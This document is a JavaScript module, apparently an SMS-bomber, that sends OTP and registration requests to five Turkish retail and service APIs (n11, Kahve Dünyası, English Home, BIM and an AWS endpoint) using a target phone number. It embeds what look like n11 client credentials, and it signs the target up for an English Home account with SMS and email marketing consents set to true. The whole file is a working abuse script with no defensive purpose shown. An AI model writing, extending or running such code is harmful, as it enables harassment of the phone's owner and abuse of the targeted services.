var request=require("request")
var self=require("./Var.js")
async function Sms(phone,is)
{
	if(is=="true")
	{


	var options=
	{
		method :"POST",
		json : true,
		url :   "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3",
		headers : 
		{
			"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"
		},
		body :
		{
			"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": phone, "userType": "BUYER"
		}
	};



	var options2=
		{
		method :"POST",
		json : true,
		url :   "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
		headers : 
		{
		 	 "Content-Type": "application/json", "Accept": "*/*"
		},
		body :
		{
			"msisdn" : "90"+phone
		}
		};


		var options3=
		{
		method :"POST",
		json : true,
		url :   "https://core.kahvedunyasi.com/api/users/sms/send",
		headers : 
		{
		 	 "Content-Type": "application/json", "Accept": "*/*"
		},
		body :
		{
			"mobile_number": phone,
             "token_type": "register_token"
		}
		};


		var options4=
		{
		method :"POST",
		json : true,
		url :   "https://www.englishhome.com:443/enh_app/users/registration/",
		headers : 
		{
		 	 "Content-Type": "application/json", "Accept": "*/*"
		},
		body :
		{
			"first_name": self.name,
			"last_name": self.name,
			 "email": self.mail,
			 "phone": "0"+phone, 
			 "password": self.password, 
			 "email_allowed": "true", 
			 "sms_allowed": "true", 
		     "confirm": "true", 
			 "tom_pay_allowed": "true"
		}
		};


		var options5=
		{
		method :"POST",
		json : true,
		url :   "https://bim.veesk.net:443/service/v1.0/account/login",
		headers : 
		{
		 	 "Content-Type": "application/json", "Accept": "*/*"
		},
		body :
		{
			
			 "phone":phone, 
			
		}
		};



	try 
	{
		const res=request(options)
		const res2=request(options2)
		const res3=request(options3)
		const res4=request(options4)
		const res5=request(options5)
		console.log("Send!")
	
	}
	catch(smserr)
	{
		console.log("Request Err")
		return smserr;
	}
 }
}
module.exports=Sms;